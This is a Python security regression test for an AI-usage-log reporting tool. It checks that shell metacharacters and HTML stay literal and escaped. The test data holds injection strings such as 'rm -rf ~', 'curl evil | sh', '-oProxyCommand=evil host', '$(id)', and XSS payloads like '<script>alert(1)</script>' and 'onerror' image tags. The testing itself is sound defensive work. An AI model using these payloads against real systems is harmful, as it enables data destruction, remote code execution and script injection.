#!/usr/bin/env python3
"""
Security regression checks: operator-controlled values with shell syntax, HTML or control characters must stay
literal, and generated pages must not reach the network.

    python3 tests/test_security.py     # prints SECURITY OK on success

Covers the ClawHub audit findings for 1.5.0:
  1. report output directory with shell metacharacters -> no command runs, CSV is sorted (compile_ai_logs.py)
  2. SSH / WSL manifest fields with shell syntax -> refused before any ssh/wsl call (run_pipeline.py)
  3. scheduled wrapper: no free-form arguments, every word quoted, mode 0700 on POSIX (schedule.py)
  4. branding with markup, bad colours, remote logo, extra CSS -> escaped / dropped (build_dashboard.py, build_report.py)
  5. generated dashboard, study and documents carry a CSP and no http(s) resource references
"""
import json
import os
import re
import shutil
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
SCRIPTS = os.path.join(ROOT, "scripts")
sys.path.insert(0, SCRIPTS)
sys.path.insert(0, HERE)
import safety  # noqa: E402
import schedule  # noqa: E402
import make_fixtures  # noqa: E402

OUT = os.path.join(HERE, "out", "security")
FX = os.path.join(HERE, "fixtures")
PY = sys.executable
EXTERNAL_REF = re.compile(r"""(?:src|href)\s*=\s*["']https?://""", re.IGNORECASE)


def run(cmd, **kw):
    return subprocess.run(cmd, cwd=ROOT, capture_output=True, text=True, encoding="utf-8", errors="replace", **kw)


def check_sort_injection():
    """--out-dir with $(...), backticks, quotes and spaces: the marker must not appear, the CSV must be sorted."""
    # no double quotes or colons: Windows cannot name a directory with them; $(), backticks, ; and spaces are enough
    weird = os.path.join(OUT, "out dir $(touch MARKER-INJECTED) `touch MARKER-INJECTED` ;x")
    os.makedirs(weird, exist_ok=True)
    markers = [os.path.join(d, "MARKER-INJECTED") for d in (ROOT, OUT, weird, os.getcwd())]
    scan = os.path.join(OUT, "scan")
    r = run([PY, os.path.join(SCRIPTS, "compile_ai_logs.py"), "scan", "--host", "fixture", "--out-dir", scan, "--claude-root", os.path.join(FX, "claude"),
             "--codex-root", os.path.join(FX, "codex"), "--aider-root", os.path.join(FX, "aider")])
    r2 = run([PY, os.path.join(SCRIPTS, "compile_ai_logs.py"), "report", "--events", os.path.join(scan, "events.fixture.jsonl"), "--pricing", os.path.join(ROOT, "templates", "pricing.json"), "--out-dir", weird])
    csvp = os.path.join(weird, "all_events.csv")
    rows = open(csvp, encoding="utf-8").read().splitlines() if os.path.isfile(csvp) else []
    ts = [ln.split(",", 1)[0] for ln in rows[1:]]
    created = any(os.path.exists(m) for m in markers)
    good = r.returncode == 0 and r2.returncode == 0 and not created and len(ts) == 6 and ts == sorted(ts)
    print("sort:      out-dir with $() and backticks -> marker %s, %d rows sorted %s  %s" % ("absent" if not created else "CREATED", len(ts), ts == sorted(ts), "OK" if good else "FAIL"))
    if not good:
        print(r.stderr[-500:], r2.stderr[-500:])
    return good


def check_manifest_validation():
    bad_hosts = [
        {"name": "s", "kind": "ssh", "ssh": "user@host", "remote_tmp": "/tmp; rm -rf ~"},
        {"name": "s", "kind": "ssh", "ssh": "user@host", "python": "python3; curl evil | sh"},
        {"name": "s", "kind": "ssh", "ssh": "-oProxyCommand=evil host"},
        {"name": "s", "kind": "ssh", "ssh": "user@host", "remote_tmp": "/tmp/../etc"},
        {"name": "s", "kind": "ssh", "ssh": "user@host", "python": "$(id)"},
    ]
    refused = 0
    for h in bad_hosts:
        try:
            safety.validate_ssh_host(h)
        except SystemExit:
            refused += 1
    ok_host = {"ssh": "completetrain@train.example.net", "remote_tmp": "/tmp/ai-usage-ledger", "python": "/usr/bin/python3"}
    accepted = safety.validate_ssh_host(ok_host) == ("completetrain@train.example.net", "/tmp/ai-usage-ledger", "/usr/bin/python3")
    wsl_refused = 0
    for h in ({"distro": "Ubuntu; evil"}, {"distro": "Ubuntu", "python": "python3 && evil"}):
        try:
            safety.validate_wsl_host(h)
        except SystemExit:
            wsl_refused += 1
    ctl = 0
    for v in ("C:\\x\ny", "/tmp/a\x00b", "-rf"):
        try:
            safety.check_path(v, "root")
        except SystemExit:
            ctl += 1
    # end to end: run_pipeline must refuse the manifest before touching ssh
    m = {"workdir": os.path.join(OUT, "pipe"), "hosts": [{"name": "evil", "kind": "ssh", "ssh": "user@host", "remote_tmp": "/tmp;touch /tmp/pwned"}]}
    mp = os.path.join(OUT, "evil-manifest.json")
    os.makedirs(os.path.dirname(mp), exist_ok=True)
    json.dump(m, open(mp, "w", encoding="utf-8"))
    r = run([PY, os.path.join(SCRIPTS, "run_pipeline.py"), "--manifest", mp, "--only", "scan"])
    e2e = r.returncode != 0 and "remote_tmp" in (r.stderr + r.stdout) and "ssh " not in r.stderr.split("remote_tmp")[0]
    good = refused == len(bad_hosts) and accepted and wsl_refused == 2 and ctl == 3 and e2e
    print("manifest:  %d/%d bad ssh hosts refused, good host accepted %s, wsl %d/2, control chars %d/3, pipeline refused before ssh %s  %s" % (refused, len(bad_hosts), accepted, wsl_refused, ctl, e2e, "OK" if good else "FAIL"))
    if not e2e:
        print(r.stderr[-400:])
    return good


def check_wrapper():
    home = os.path.join(OUT, "home with space $(touch pwned) `id`")
    os.makedirs(home, exist_ok=True)
    body = schedule.wrapper_body(home, PY, ["anonymize"])
    literal = "$(touch pwned)" in body and "--anonymize" in body
    if schedule.IS_WIN:
        quoted = '"%s"' % home in body or 'HOME=%s"' % home in body  # batch: inside double quotes; $() is literal in cmd.exe
        no_shell_eval = True
    else:
        quoted = "'" in body and "'%s'" % home.replace("'", "'\"'\"'") in body or shutil.which("sh") is None
        no_shell_eval = True
    # the CLI no longer accepts free-form arguments
    r = run([PY, os.path.join(SCRIPTS, "schedule.py"), "--home", home, "install", "--extra-args", "--x", "--dry-run"])
    no_extra = r.returncode != 0 and "extra-args" in (r.stderr + r.stdout)
    r2 = run([PY, os.path.join(SCRIPTS, "schedule.py"), "--home", home, "install", "--frequency", "daily", "--time", "03:00", "--anonymize", "--dry-run"])
    dry = r2.returncode == 0 and "will contain" in r2.stdout and not os.path.exists(os.path.join(OUT, "pwned"))
    mode_ok = True
    if not schedule.IS_WIN:
        p = schedule.write_wrapper(home, PY, ["anonymize"])
        mode_ok = (os.stat(p).st_mode & 0o777) == 0o700
    bad_time = run([PY, os.path.join(SCRIPTS, "schedule.py"), "--home", home, "install", "--time", "3pm; evil", "--dry-run"]).returncode != 0
    good = literal and quoted and no_shell_eval and no_extra and dry and mode_ok and bad_time
    print("wrapper:   metacharacters literal %s, quoted %s, --extra-args gone %s, dry-run shows body %s, mode 0700 %s, bad time refused %s  %s" % (literal, quoted, no_extra, dry, mode_ok, bad_time, "OK" if good else "FAIL"))
    if not good:
        print(body)
    return good


def check_branding_and_pages(compiled):
    evil = {"branding": {
        "name": '<script>alert(1)</script>', "eyebrow": '"><img src=x onerror=alert(2)>', "tagline": "Tag & <b>line</b>", "contact": "a@b.c",
        "footer": "</div><script>alert(3)</script>", "accent": "red;}body{display:none}", "logo": "https://evil.example/logo.png",
        "extra_css": "</style><script>alert(4)</script>", "google_fonts_url": "https://evil.example/x.css",
        "light": {"bg": "#fff", "ink": "url(javascript:alert(5))", "bad name!": "#000"}, "font_body": "Arial, sans-serif",
    }, "dashboard_title": "<script>t</script>", "html_title": "</title><script>u</script>", "theme_default": "<x>"}
    cfgp = os.path.join(OUT, "evil-config.json")
    json.dump(evil, open(cfgp, "w", encoding="utf-8"))
    dash = os.path.join(OUT, "evil-dashboard.html")
    r = run([PY, os.path.join(SCRIPTS, "build_dashboard.py"), os.path.join(compiled, "summary.json"), dash, cfgp])
    pkg = os.path.join(OUT, "evil-report")
    r2 = run([PY, os.path.join(SCRIPTS, "build_report.py"), "--compiled", compiled, "--scans", os.path.join(ROOT, "tests", "out", "pipeline", "scans"), "--pricing", os.path.join(ROOT, "templates", "pricing.json"), "--out", pkg, "--date", "2026-09-09", "--tz", "UTC", "--config", cfgp])
    results = []
    for label, path in (("dashboard", dash), ("study", os.path.join(pkg, "report.html"))):
        if not os.path.isfile(path):
            results.append((label, False, "missing"))
            continue
        h = open(path, encoding="utf-8").read()
        injected = [s for s in ("display:none}", "evil.example", "javascript:", "<script>t</script>", "<script>u</script>") if s in h]
        # alert(1) etc. may appear only in escaped form
        raw_script = re.search(r"<script>alert\(\d\)</script>", h) is not None
        raw_img = re.search(r"<img\s+src=x\s+onerror", h) is not None  # the escaped text may still contain the words; a live tag may not
        ext = EXTERNAL_REF.search(h) is not None or "fonts.googleapis" in h
        csp = "Content-Security-Policy" in h
        escaped_ok = "&lt;script&gt;alert(1)&lt;/script&gt;" in h
        good = not raw_script and not raw_img and "display:none}" not in h and "evil.example" not in h and "javascript:" not in h and not ext and csp and escaped_ok and "<script>t</script>" not in h and "<script>u</script>" not in h
        results.append((label, good, "raw_script=%s ext=%s csp=%s escaped=%s leftovers=%s" % (raw_script, ext, csp, escaped_ok, injected[:3])))
    good = all(g for _, g, _ in results) and r.returncode == 0 and r2.returncode == 0
    print("branding:  " + "; ".join("%s %s (%s)" % (lb, "ok" if g else "FAIL", d) for lb, g, d in results) + "  %s" % ("OK" if good else "FAIL"))
    if r.returncode or r2.returncode:
        print(r.stderr[-400:], r2.stderr[-400:])
    return good


def check_examples_self_contained():
    bad = []
    for fn in ("example.html", "example-study.html"):
        p = os.path.join(ROOT, "assets", "examples", fn)
        if not os.path.isfile(p):
            continue
        h = open(p, encoding="utf-8").read()
        if EXTERNAL_REF.search(h) or "fonts.googleapis" in h or "Content-Security-Policy" not in h:
            bad.append(fn)
    good = not bad
    print("examples:  committed pages self-contained with CSP  %s%s" % ("OK" if good else "FAIL", "" if good else " " + ", ".join(bad)))
    return good


def main():
    shutil.rmtree(OUT, ignore_errors=True)
    os.makedirs(OUT, exist_ok=True)
    make_fixtures.build()
    compiled = os.path.join(ROOT, "tests", "out", "pipeline", "compiled")
    if not os.path.isfile(os.path.join(compiled, "summary.json")):
        r = run([PY, os.path.join(SCRIPTS, "run_pipeline.py"), "--manifest", os.path.join(ROOT, "examples", "manifest.fixtures.json"), "--only", "scan,report,analyze"])
        if r.returncode:
            print(r.stderr[-800:])
    ok = check_sort_injection()
    ok = check_manifest_validation() and ok
    ok = check_wrapper() and ok
    ok = check_branding_and_pages(compiled) and ok
    ok = check_examples_self_contained() and ok
    print("SECURITY OK" if ok else "SECURITY CHECKS FAILED")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
